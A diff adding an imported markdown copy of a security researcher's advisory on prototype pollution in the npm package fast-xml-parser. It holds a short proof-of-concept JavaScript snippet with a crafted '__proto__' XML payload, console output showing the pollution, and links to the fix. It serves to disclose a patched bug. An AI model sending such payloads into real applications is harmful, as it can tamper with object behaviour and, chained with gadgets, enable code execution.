@@ -1,0 +1,106 @@
+---
+source: imported
+source_type: markdown
+original_path: knowledge-inbox/blogs-incoming/2022-04-14_prototype-pollution-in-fast-xml-parser.md
+original_filename: 2022-04-14_prototype-pollution-in-fast-xml-parser.md
+title: Prototype Pollution in fast-xml-parser
+category: documents
+detected_topics:
+- supply-chain
+- sso
+- command-injection
+- api-security
+tags:
+- imported
+- documents
+- supply-chain
+- sso
+- command-injection
+- api-security
+language: en
+raw_sha256: 0780119b4e087ffcc3ac0bffb987969aaf9b3e92a4d27cab64b9943c20a30905
+text_sha256: 4a85b18bcda337730a28f21bee6d9c838fb976e30181dc3a3bfac7e19799a0ab
+ingested_at: '2026-06-28T07:32:11Z'
+sensitivity: unknown
+redactions_applied: false
+---
+
+# Prototype Pollution in fast-xml-parser
+
+## Source Metadata
+
+- Original Path: knowledge-inbox/blogs-incoming/2022-04-14_prototype-pollution-in-fast-xml-parser.md
+- Source Type: markdown
+- Detected Topics: supply-chain, sso, command-injection, api-security
+- Ingested At: 2026-06-28T07:32:11Z
+- Redactions Applied: False
+- Raw SHA256: `0780119b4e087ffcc3ac0bffb987969aaf9b3e92a4d27cab64b9943c20a30905`
+- Text SHA256: `4a85b18bcda337730a28f21bee6d9c838fb976e30181dc3a3bfac7e19799a0ab`
+
+
+## Content
+
+---
+title: "Prototype Pollution in fast-xml-parser"
+page_title: "advisories/2023/npm-package/fast-xml-parser.md at main · Sudistark/advisories · GitHub"
+url: "https://github.com/Sudistark/advisories/blob/main/2023/npm-package/fast-xml-parser.md"
+final_url: "https://github.com/Sudistark/advisories/blob/main/2023/npm-package/fast-xml-parser.md"
+authors: ["Sudhanshu Rajbhar (@sudhanshur705)"]
+bugs: ["Prototype pollution"]
+publication_date: "2022-04-14"
+added_date: "2022-06-05"
+source: "pentester.land/writeups.json"
+original_index: 2708
+---
+
+I was auditing another application and found that they were using `fast-xml-parser` parse uploaded xml files.
+
+The package description says _Validate XML, Parse XML to JS Object, or Build XML from JS Object without C/C++ based libraries and no callback._
+
+_Parse XML to JS Object_ \- this sounded very interesting and I knew I should test for prototype pollution as many other packages which _convert json to js objects_ were found to be vulnerable in the past and it turned out yeah this package was vulnerable to it.
+
+<https://www.npmjs.com/package/fast-xml-parser>
+
+[![image](https://user-images.githubusercontent.com/31372554/232062163-c4a4494c-429e-416b-ab41-3e3bc38aef6a.png)](https://user-images.githubusercontent.com/31372554/232062163-c4a4494c-429e-416b-ab41-3e3bc38aef6a.png)
+
+<https://github.com/NaturalIntelligence/fast-xml-parser>
+
+Taking an example code from the github repo to demonstrate the bug:
+  
+  
+  const { XMLParser, XMLBuilder, XMLValidator} = require("fast-xml-parser");
+  
+  
+  let XMLdata = "<__proto__><polluted>hacked</polluted></__proto__>"
+  
+  const parser = new XMLParser();
+  let jObj = parser.parse(XMLdata);
+  
+  
+  console.log(jObj.polluted) // should return hacked
+
+[![Code_G3UvvJcSv5](https://user-images.githubusercontent.com/31372554/218308540-86792929-3631-4580-8373-4651487418b5.png)](https://user-images.githubusercontent.com/31372554/218308540-86792929-3631-4580-8373-4651487418b5.png)
+
+In the above screenshot you can see the `jObj` was polluted with a new property.
+  
+  
+  jObj
+  >{}
+  jObj.__proto__
+  >{polluted: 'hacked'}
+  jObj.__proto__.polluted
+  >'hacked'
+
+More information on prototype pollution can be found here: <https://learn.snyk.io/lessons/prototype-pollution/javascript/>
+
+As it is common for developers to pass user controllable input to `XMLParser` , this can to do unexpected results. By chaining it with some prototype pollution gadget it might even can lead to RCE in some cases <https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/>
+
+Fix commit: <https://github.com/NaturalIntelligence/fast-xml-parser/commit/2b032a4f799c63d83991e4f992f1c68e4dd05804>
+
+They are now validating, if the key contains `__proto__` and replaces it with `#__proto__`
+
+CVE is still pending
+
+The package maintainer @amitguptagwl was very swift in replies and addressing the reported issue :)
+
+SNYK Advisory: <https://security.snyk.io/vuln/SNYK-JS-FASTXMLPARSER-3325616>
